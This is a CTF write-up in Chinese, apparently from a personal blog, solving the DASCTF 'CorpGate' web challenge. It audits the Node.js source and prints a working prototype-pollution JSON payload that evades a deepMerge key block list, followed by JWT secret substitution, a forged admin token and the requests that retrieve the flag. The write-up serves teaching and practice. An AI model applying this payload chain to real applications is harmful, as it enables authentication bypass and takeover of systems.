---
title: 2026DASCTF夏季赛Web方向CorpGate
description: 太菜了，Web只会写这一个，真哭了
date: 2026-05-30 19:09:05
updated: 2026-05-30 19:09:05
image: https://img.yanxisishi.top/images/2026/05/17227647103454592.
categories: [CTF]
tags: [DASCTF]
---

## 题目介绍

一套全新的企业员工门户系统 CorpGate。

## 附件结构

用 tree 命令查看：

```bash
tree src
```

返回：

```txt
src
├── app.js
├── config.js
├── middleware
│   └── auth.js
├── package.json
├── public
│   └── css
│       └── style.css
├── routes
│   ├── admin.js
│   ├── auth.js
│   ├── diagnostic.js
│   └── user.js
├── utils
│   ├── jwt.js
│   └── merge.js
└── views
    ├── admin.ejs
    ├── dashboard.ejs
    ├── directory.ejs
    ├── forbidden.ejs
    ├── index.ejs
    ├── register.ejs
    └── settings.ejs

7 directories, 18 files
```

## 代码审计

### 1. 看路由

第一步依旧是先去看路由，路由配置在 `app.js` 中：

```js
const { router: authRouter } = require('./routes/auth');
const userRouter = require('./routes/user');
const adminRouter = require('./routes/admin');
const diagnosticRouter = require('./routes/diagnostic');

app.use('/', authRouter);
app.use('/', userRouter);
app.use('/', adminRouter);
app.use('/', diagnosticRouter);
```

存在这么四个路由，均在 `routes` 目录下，因此去 `route` 目录中的四个文件里找 flag 的返回逻辑，接着逆推实现条件即可。

### 2. 找 flag 返回逻辑

在 vscode 的 `在文件中查找...` 功能里搜 `flag` 关键词，在 `routes/diagnostic.js` 中找到 flag 返回逻辑：

```js
var output = 'Diagnostic failed';
try {
  output = execSync('/readflag').toString().trim();
} catch (e) {}

res.json({ status: 'completed', report: output });
```

往前逆推当前源码，看到触发代码的前提条件：

```js
router.post('/api/reports/execute', authMiddleware, adminMiddleware, (req, res) => {
  var ref = req.body.reference;
  if (!ref || typeof ref !== 'string') {
    return res.status(400).json({ error: 'Missing report reference' });
  }

  var entry = config.diagnosticStore[ref];
  if (!entry) {
    return res.status(404).json({ error: 'Invalid or expired reference' });
  }
```

这里：

1. 在访问 `/api/reports/execute` 路由时设置了以 POST 请求方式和 `authMiddleware, adminMiddleware` 的限制
2. 将 body 中的 `reference` 赋给 `ref`，用 `ref` 当键查 `config.diagnosticStore[ref]`，要求 `config.diagnosticStore[ref]` 这条记录是存在的。

所以现在要找哪里会生成 `config.diagnosticStore[ref]` 的记录，在整个附件源码中用 vscode 的 `在文件中查找...` 功能查找 `diagnosticStore`，在 `admin.js` 中找到：

```js
router.get('/admin', authMiddleware, adminMiddleware, (req, res) => {
  var tokenId = crypto.randomBytes(16).toString('hex');
  var entry = Object.create(null);
  ...
  config.diagnosticStore[tokenId] = entry;

  var stats = {
    ...
    reference: tokenId
  };
  res.render('admin', { user: req.user, stats: stats });
});
```

所以以 GET 请求方式访问 `/admin`，会生成一条 `config.diagnosticStore[tokenId]` 的记录并回显在返回结果中，其中 `tokenId` 是随机生成的 32 位字符串，也是 `ref` 需要等于的值，也是在访问 `/api/reports/execute` 时需要以 POST 请求方式传入 `reference` 参数的值。

**总结一下，这里触发 flag 返回逻辑需要：**

1. 先通过 `authMiddleware` 和 `adminMiddleware` 的验证。
2. 再以 GET 请求方式访问 `/admin`，拿到 `tokenId` 的值 `xxx`。
3. 最后以 POST 请求方式访问 `/api/reports/execute` 并传入 `reference=xxx` 才能触发 flag 返回逻辑。

### 3. 分析核心方法

接下来就是去找 `authMiddleware` 和 `adminMiddleware` 这两个验证条件的定义式，看到当前源码的最顶部有：

```js
const { authMiddleware, adminMiddleware } = require('../middleware/auth');
```

说明两个验证条件的定义均在 `middleware/auth.js` 中，直接去看这个源码。

先看 `authMiddleware` 的定义：

```js
function authMiddleware(req, res, next) {
  var token = req.cookies[config.cookieName];
  if (!token) {
    return res.redirect('/');
  }
  try {
    var secret = getSigningKey();
    var decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
    req.user = decoded;
    next();
  } catch (e) {
    res.clearCookie(config.cookieName);
    return res.redirect('/');
  }
}
```

大致意思就是得有个账号，Cookie 里的 JWT （HS256 签名校验）能验证通过，随便注册一个就能通过。

接着看 `adminMiddleware` 的定义：

```js
function adminMiddleware(req, res, next) {
  if (!req.user || req.user.role !== 'admin') {
    return res.status(403).render('forbidden', { user: req.user });
  }
  var rateCtx = Object.create(null);
  rateCtx.window = 60000;
  rateCtx.remaining = 100;
  if (Object.prototype.hasOwnProperty.call(config.featureFlags, 'auditLog') && config.featureFlags.auditLog) {
    rateCtx.logged = true;
  }
  next();
}
```

大致意思是 Cookie 里的 JWT 中的 `role` 值得是 `admin`。

**所以本题的核心很明显了：伪造 `role` 值为 `admin` 的合规 JWT。**

### 4. JWT 伪造

但是伪造签名校验方式为 HS256 的 JWT 的核心就是要已知 JWT 密钥，接下来去找 JWT 密钥的核心逻辑即可。

看到刚刚 `authMiddleware` 的定义中有关 JWT 密钥的部分：

```js
var secret = getSigningKey();
var decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
```

所以 JWT 密钥生成的核心方法是 `getSigningKey()`，在当前源码中定位到：

```js
function getSigningKey() {
  return config.signingState.active;
}
```

这里的 `config` 是题目作者提供的模块对象变量，可以看到：

```js
const config = require('../config');
```

所以接下来去到 `config.js` 的源码，看到有关 `signingState.active` 的关键源码：

```js
signingState.active = jwtConfig.secret;
```

所以 `signingState.active` 的值实际就是 `jwtConfig` 变量的 `secret` 属性的值，定位到源码：

```js
const jwtConfig = {
  secret: crypto.randomBytes(32).toString('hex'),
  algorithm: 'HS256',
  expiresIn: '24h'
};
```

所以本题的 JWT 密钥实际就是 `crypto.randomBytes(32).toString('hex')`，即一个随机的 64 字符密钥。

既然是一个随机的 64 字符密钥，那也无法当作已知条件或者通过爆破拿到 JWT 密钥实现 JWT 伪造，那就需要换其他的思路。

### 5. 原型链污染

实际上刚刚在查找有关 `signingState.active` 的源码时，还能看到：

```js
signingState.active = rotation.pending;
```

说明还有一次机会可以修改 `signingState.active` 的值，源码说明只需要满足：

1. 触发 `configRefresh()` 函数；
2. `rotation.pending` 存在。

就能将 `signingState.active` 的值修改为 `rotation.pending` 的值。

接下来要做的就是在整个附件源码中用 vscode 的 `在文件中查找...` 功能查找 `configRefresh(` ，找到了在 `routes/user.js` 中有：

```js
router.get('/api/system/healthcheck', (req, res) => {
  var result = config.configRefresh();
```

说明以 GET 请求方式访问 `/api/system/healthcheck` 就能触发 `configRefresh()` 函数。

接下来要解决的就是怎么让 `rotation.pending` 存在并赋上可以已知的作为 JWT 密钥的值。

回到 `config.js` 中有关 `configRefresh()` 函数的源码，看到有关 `rotation` 对象的定义：

```js
function configRefresh() {
  var rotation = {};
  rotation.source = 'vault';
  rotation.timestamp = Date.now();
```

可以看到在创建 `rotation` 对象时，实际并没有 `pending` 这样一个属性，后续也没啥办法加上，推测这里大概率需要通过原型链污染的方法，给 `rotation` 对象赋上一个 `pending` 的属性。

而如果存在原型链污染，说明一定存在某个路由可以作为入口传入 payload，且大概率是以 POST 的请求方式传入 JSON 格式的 payload。

在附件源码里全局搜索 `req.body` 和 `router.post(`，并寻找存在可能实现原型链污染的可疑函数，在 `routes/user.js` 中找到：

```js
router.post('/api/settings', authMiddleware, (req, res) => {
  ...
  deepMerge(user.settings, req.body);
```

其中可疑函数为 `deepMerge()`，在当前源码中查找，源码最前面找到：

```js
const { deepMerge } = require('../utils/merge');
```

去到 `utils/merge.js` 查看这个可疑函数的核心源码：

```js
function deepMerge(target, source, depth) {
  if (depth === undefined) depth = 0;
  if (depth >= MAX_DEPTH) return target;
  for (var rawKey in source) {
    var key = sanitizeKey(rawKey);
    if (key === '') continue;
    if (BLOCKED_KEYS.indexOf(key) !== -1) continue;
    if (depth < 3 && BLOCKED_ROOTS.indexOf(key) !== -1) continue;
    if (isPlainObject(source[rawKey])) {
      if (typeof target[key] === 'object' && target[key] !== null) {
        deepMerge(target[key], source[rawKey], depth + 1);
      } else if (typeof target[key] === 'function') {
        deepMerge(target[key], source[rawKey], depth + 1);
      }
    } else {
      target[key] = source[rawKey];
    }
  }
  return target;
}
```

其中 `BLOCKED_ROOTS`、`BLOCKED_KEYS` 和 `MAX_DEPTH` 的源码在最前面：

```js
const BLOCKED_ROOTS = ['__proto__', '__defineGetter__', '__defineSetter__', 'constructor', 'prototype'];
const BLOCKED_KEYS = ['__proto__', '__defineGetter__', '__defineSetter__'];
const MAX_DEPTH = 6;
```

这段源码说明 `deepMerge()` 的作用是将用户提交的嵌套对象按层递归合并到目标对象中，确实证明了 `deepMerge()` 方法有实现原型链污染的可能，但在源码中还做了过滤限制：

```js
if (depth >= MAX_DEPTH) return target;

if (BLOCKED_KEYS.indexOf(key) !== -1) continue;
if (depth < 3 && BLOCKED_ROOTS.indexOf(key) !== -1) continue;
```

这里说明：

1. 最多嵌套六层。
2. `BLOCKED_KEYS` 全部层数生效。
3. `BLOCKED_ROOTS` 仅在第 3 层前（`depth < 3`）生效。

所以在第 3 层及第 3 层后可以使用 `constructor` 和 `prototype` 的危险属性。

> `constructor`：对象的构造函数（对普通对象通常是 `Object`，）
>
> `prototype`：这个构造函数对应的原型对象。

这里进行原型链污染的入口对象是 `routes/user.js`：

```js
deepMerge(user.settings, req.body);
```

中的 `user.settings`，作为 `depth 0`。

但是由于当 `depth < 3` 时存在 `BLOCKED_ROOTS` 的限制，这里得不断深入寻找以 `user.settings` 为根的嵌套属性。

### 6. 绕过原型链污染限制

所以现在要去寻找变量 `user` 拥有的嵌套属性，回到 `routes/user.js` 中有关 `/api/settings` 的路由，找到：

```js
router.post('/api/settings', authMiddleware, (req, res) => {
  const user = Object.values(users).find(u => u.id === req.user.id);
```

说明变量 `user` 的属性来源于变量 `users`。

附件源码全局寻找 `const users`，定位到 `routes/auth.js` 中，找到：

```js
const users = {};

users[username] = {
  id: userId,
  username: username,
  password: password,
  email: email,
  department: department,
  role: 'employee',
  settings: {
    theme: 'light',
    language: 'en',
    notifications: {
      email: true,
      desktop: true,
      digest: { frequency: 'daily', time: '09:00', channels: { slack: true, teams: false } }
    }
  }
};
```

说明变量 `users` 的嵌套属性关系是：

```txt
users -> settings -> notifications -> digest -> channels -> teams
```

既然刚刚得知了 `user.settings` 会作为 `depth 0`，那么接下来就可以：

1. 让 `user.settings.notifications` 作为 `depth 1`，其中 `notifications` 这个键会在 `depth 0` 这一层被处理。
2. 让 `user.settings.notifications.digest` 作为 `depth 2`，其中 `digest` 这个键会在 `depth 1` 这一层被处理。
3. 让 `user.settings.notifications.digest.channels` 作为 `depth 3`，其中 `channels` 这个键会在 `depth 2` 这一层被处理。

之后的属性就会在 `depth 3` 及 `depth 3` 以后的层数处理，可以放出 `constructor` 和 `prototype` 的危险属性，即这里可以污染到 `Object.prototype` 的属性。

由于 `rotation` 的查找链就是：

```txt
rotation（自身） -> Object.prototype -> null
```

所以为 `Object.prototype` 赋上值为 `123` 的 `pending` 的属性后，变量 `rotation` 也会被赋上值为 `123` 的 `pending` 的属性。

## 解题流程

最后总结一下本题的具体解题流程：

1. 进入靶机首页，随便注册一个普通账号并登录。

2. 用 BurpSuite 抓包，以 POST 请求方式向 `/api/settings` 路由发送 JSON 格式的 payload：

   ```json
   {
     "notifications": {
       "digest": {
         "channels": {
           "constructor": {
             "prototype": {
               "pending": "yanxi"
             }
           }
         }
       }
     }
   }
   ```

   ![image-20260530173215143](https://img.yanxisishi.top/images/2026/05/image-20260530173215143.png)

3. 用 BurpSuite 以 GET 请求方式访问 `/api/system/healthcheck` 触发 `configRefresh()` 方法，使得原本随机未知的 JWT 密钥被篡改成 `yanxi`。

   ![image-20260530173306028](https://img.yanxisishi.top/images/2026/05/image-20260530173306028.png)

4. 使用 BurpSuite 插件 JWT Editor 伪造 `role` 值为 `admin` 的 JWT：

   ![image-20260530173952415](https://img.yanxisishi.top/images/2026/05/image-20260530173952415.png)

   ![image-20260530174117407](https://img.yanxisishi.top/images/2026/05/image-20260530174117407.png)

   拿上复制好的 JWT：

   ```txt
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImYyOTg3Mzk0LWRjODUtNGE3NS1hYTYwLTEyYjg4YzM4ODgwOSIsInVzZXJuYW1lIjoidGVzdCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4MDEzMjkwNywiZXhwIjoxNzgwMjE5MzA3fQ.vF_UPQFmrHwxGbmT9bUgmRsXnnziAFeslOKBfsC2MgM
   ```

   回到靶机页面，替换掉原来的 Cookie 的值：

   ![](https://img.yanxisishi.top/images/2026/05/image-20260530174336775.png)

5. 以 GET 请求方式访问 `/admin`，返回：

   ```txt
   Report Reference: e27456ae527e6a7bd7274c738534ab3b
   
   This reference is valid for 120 seconds. Use the reporting API to execute diagnostics.
   ```

6. 以 POST 请求方式访问 `/api/reports/execute`，同时 body 中传入：

   ```http
   reference=e27456ae527e6a7bd7274c738534ab3b
   ```

   返回：

   ```json
   {"status":"completed","report":"DASCTF{3925a462-b549-49ff-96e3-108ee62b071d}"}
   ```

   ![image-20260530174906953](https://img.yanxisishi.top/images/2026/05/image-20260530174906953.png)
